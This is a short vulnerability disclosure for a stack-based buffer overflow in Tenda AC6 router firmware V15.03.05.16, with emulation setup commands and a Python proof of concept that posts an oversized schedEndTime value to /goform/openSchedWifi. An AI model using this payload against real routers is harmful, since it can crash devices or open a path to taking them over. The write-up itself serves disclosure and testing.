-------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![](api/attachments/OLpMhoNjD8Vg/image/image.png)

### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

Tenda AC6 **V15.03.05.16** has a stack overflow vulnerability. The vulnerability affects the file /goform/openSchedWifi function setSchedWifi. Setting the schedEndTime parameter causes a stack-based buffer overflow.

![](api/attachments/6zraflQZ105X/image/image.png)

![](api/attachments/V6yTKP4NeXX3/image/image.png)

### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/openSchedWifi"

data = {
    "schedWifiEnable": "Raining101",
    "schedEndTime": "Raining" * 2000 
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```

![](api/attachments/qR7BsjmYHNvY/image/image.png)
